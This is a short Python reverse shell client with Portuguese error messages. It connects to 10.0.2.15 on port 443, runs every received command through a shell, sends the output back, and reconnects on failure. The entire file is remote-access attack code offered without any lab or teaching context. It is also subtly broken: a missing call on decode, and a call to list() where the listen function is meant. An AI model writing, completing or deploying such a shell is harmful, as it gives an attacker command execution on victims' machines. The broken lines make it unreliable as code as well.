import socket 
import time
import subprocess
import threading
ip = "10.0.2.15"
port = 443

def connect(ip,port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ip,port))
        return client
    except Exception as error:
        print ("Erro ao rodar" , error)




def cmd(client, data):
    try:
        proc = subprocess.Popen(data,shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")

    except Exception as error:
        print("error cmd", error)




def listen(client):
    while True:
        data = client.recv(1024).decode.strip()
        if data == "/exit":
            exit()
        else:
            threading.Thread(target=cmd, args=(client,data)).start()
       
       
            
if __name__ == "__main__":
    while True:
        client = connect(ip,port)
        if client:
            list(client)
        else:
            print("Erro ao conectar")
            time.sleep(2)
        